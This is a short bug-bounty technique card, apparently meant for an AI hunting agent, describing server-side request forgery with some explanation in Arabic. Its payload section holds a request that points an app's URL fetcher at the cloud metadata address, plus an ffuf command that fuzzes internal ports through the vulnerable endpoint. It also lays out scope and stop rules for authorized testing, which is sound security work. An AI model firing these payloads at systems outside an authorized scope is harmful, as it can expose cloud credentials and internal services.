# SKILL: SSRF: فزّينج الـ Ports الداخلية + الوصول لـ Cloud Metadata

**Skill id:** `tip/ssrf-فزّينج-الـ-ports-الداخلية-الوصول-لـ-cloud-metadata`  
**Category:** SSRF  
**Rating:** 🔥 قوية  
**Status:** Not started  
**Notion:** https://app.notion.com/p/3dddac31e880813f8819c24e454875dd  

> **Authorized testing only.** LEAD until validated on accounts/objects you own. Never auto-confirm.

## When the agent should use this skill

- Hunting track involves: **SSRF**
- Target signals match this technique
- Scope and testing envelope confirmed

## How It Works

لو لقيت أبلكيشن بيعمل fetch لـ URL محدد (image preview, PDF fetch, webhook)، جرّب تفزّيع رقم الـ port بتاع الـ URL عشان تكتشف خدمات داخلية (databases, admin panels) تحول SSRF متوسط لـ critical.

## Payload / Code

```
POST /api/fetch-preview HTTP/1.1
Content-Type: application/json
\{"url": "[http://169.254.169.254/latest/meta-data/](http://169.254.169.254/latest/meta-data/)"\}

للفزّينج الداخلي:
ffuf -u [http://internal-host:FUZZ](http://internal-host:FUZZ) -w ports.txt (في قيمة الـ URL المرسلة للـ SSRF endpoint)
```

## Source

Intigriti Official 2026 (Tip 17) + Redfox Security 2026

## Agent execution contract

1. Confirm asset is in authorized scope.
2. Baseline with an account/object you control.
3. Apply **one** mutation from the payload at a time.
4. Discriminate benign explanations (cache, public data, UI-only).
5. Classify as **LEAD** until unauthorized consequence is proven.
6. Stop if real third-party data appears beyond minimal evidence.
7. Hand off to report template only after validation checklist passes.

---
_Synced from Notion Bug Bounty Tips and Tricks · agent skill ready._
